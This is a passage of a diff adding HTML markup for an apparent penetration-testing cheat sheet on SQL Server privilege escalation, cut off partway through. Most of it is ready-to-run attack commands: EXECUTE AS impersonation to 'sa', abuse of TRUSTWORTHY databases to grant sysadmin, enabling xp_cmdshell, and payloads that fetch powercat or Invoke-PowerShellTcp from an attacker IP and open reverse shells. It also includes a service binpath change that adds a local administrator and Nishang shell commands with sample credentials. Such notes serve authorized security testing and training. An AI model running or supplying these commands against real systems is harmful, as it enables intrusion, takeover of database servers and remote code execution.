+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="public-to-sysadmin">Public to Sysadmin&lt;/h3>
+&lt;p>&lt;strong>Insecure configurations are very common&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Weak passwords
+&lt;ul>
+&lt;li>default SQL Server, default third party applications, custom SQL logins&lt;/li>
+&lt;li>user enumeration helps ;)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Excessive permissions
+&lt;ul>
+&lt;li>startup procedures, dangerous stored procedures (RWX), xp creation, CLR creation&lt;/li>
+&lt;li>impersonation, database ownership, database links, agent jobs&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>SQL Injection
+&lt;ul>
+&lt;li>EXECUTE AS LOGIN&lt;/li>
+&lt;li>Signed procedures&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Out of date versions&lt;/li>
+&lt;/ul>
+&lt;p>An automatic check for public to sysadmin privilege escalation can be done via:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLEscalatePriv&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="public-to-sysadmin---impersonation">Public to Sysadmin - Impersonation&lt;/h4>
+&lt;p>User Impersonation (EXECUTE AS): when EXECUTE AS is used, the execution context is switched to the specified login or user name. This allows impersonation of other users and logins to be able to access resources which means it can be abused to use privileges and objects available to other users.&lt;/p>
+&lt;p>The following SQL query allows to find SQL Server logins which can be impersonated in the current database:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">distinct&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_permissions&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INNER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">grantor_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">permission_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;IMPERSONATE&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or it can be done through &lt;code>PowerUpSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditPrivImpersonateLogin&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sqluser&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Sql@123&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Exploit sysadmin privileges through user impersonation (does not work if chanined/nested impersonation must be performed to get to &amp;ldquo;sa&amp;rdquo;, in fact only direct sa impersonation is supported):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditPrivImpersonateLogin&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sqluser&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Sql@123&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Exploit&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The exploitation of chained/nested impersonation can be directly done by executing queries in &lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SYSTEM_USER&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">LOGIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;dbadmin&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SYSTEM_USER&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">LOGIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ORIGINAL_LOGIN&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="public-to-sysadmin---trustworthy-database">Public to Sysadmin - Trustworthy database&lt;/h4>
+&lt;p>A database property (is_trustworthy_on) used to indicate whether a SQL Server instance trusts a database and its contents. The property is turned off by default as a security measure. Only a sysadmin can set a database to be TRUSTWORTHY. When TRUSTWORTHY is off, impersonated users (by using EXECUTE AS) will only have database-scope permissions but when TRUSTWORTHY is turned on impersonated users can perform actions with server level permissions.&lt;/p>
+&lt;p>Look for TRUSTWORTHY database using &lt;code>PowerUpSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-GridView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditPrivTrustworthy&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Look for &lt;strong>TRUSTWORTHY&lt;/strong> database (can be done with public role):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">database_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SUSER_NAME&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">owner_sid&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">database_owner&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">is_trustworthy_on&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">TRUSTWORTHY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">databases&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Look for &lt;strong>db_owner&lt;/strong> role (can be done with public role) on the found trustworthy database:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseRoleName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">isnull&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;No members&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseUserName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_role_members&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">RIGHT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">role_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">member_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;R&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Perform EXECUTE AS in &lt;code>HeidiSQL&lt;/code>to become the db owner (with elevated privileges) and give a Domain User the sysadmin role:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">USER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;dbowner&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">system_user&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_addsrvrolemember&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;DOMAIN\USER&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sysadmin-to-os-service-account">Sysadmin to OS Service Account&lt;/h3>
+&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-xp_cmdshell">Sysadmin to OS Service Account - Command Execution with xp_cmdshell&lt;/h4>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- If xp_cmdshell is uninstalled:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_addextendedproc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_cmdshell&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;xplog70.dll&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- If xp_cmdshell is disabled:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;show advanced options&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_cmdshell&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute a payload via HeidiSQL to get a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Query to be executed in HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -c test-netconnection 192.168.50.53 -port 80&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.50.53/powercat.ps1&amp;#39;&amp;#39;); powercat -c 192.168.50.53 -p 4444 -e cmd -v&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -ep bypass -c . \\192.168.50.50\share\PowerUp.ps1; Invoke-AllChecks&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># On the local machine:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">4444&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1000&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Once you get a stable shell you can escalate your privileges&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">qc&lt;/span> &lt;span class="n">ALG&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">config&lt;/span> &lt;span class="n">ALG&lt;/span> &lt;span class="n">binpath&lt;/span>&lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;net localgroup administrators CYBERLAB\user01 /add&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">qc&lt;/span> &lt;span class="n">ALG&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="n">ALG&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc start &lt;/span>&lt;span class="n">ALG&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">localgroup&lt;/span> &lt;span class="n">administrators&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;code>Nishang&lt;/code>:&lt;/p>
+&lt;p>Automatically enable xp_cmdshell and open a shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Authenticate through windows authentication (for an alternative user you need to launch a new PowerShell session with different credentials) and open a shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-WindowsAuthentication&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Authenticate and execute a payload:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-WindowsAuthentication&lt;/span> &lt;span class="n">-payload&lt;/span> &lt;span class="s2">&amp;#34;iex ((New-Object Net.Webclient).downloadstring(&amp;#39;&amp;#39;http://192.168.254.1/Invoke-PowerShellTcp.ps1&amp;#39;&amp;#39;));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.1 -Port 443&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If no payload is specified it is possible to spawn a shell (powershell, cmd or mssql):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;Password1&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
+&lt;p>Automatically enable xp_cmdshell and execute the command:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
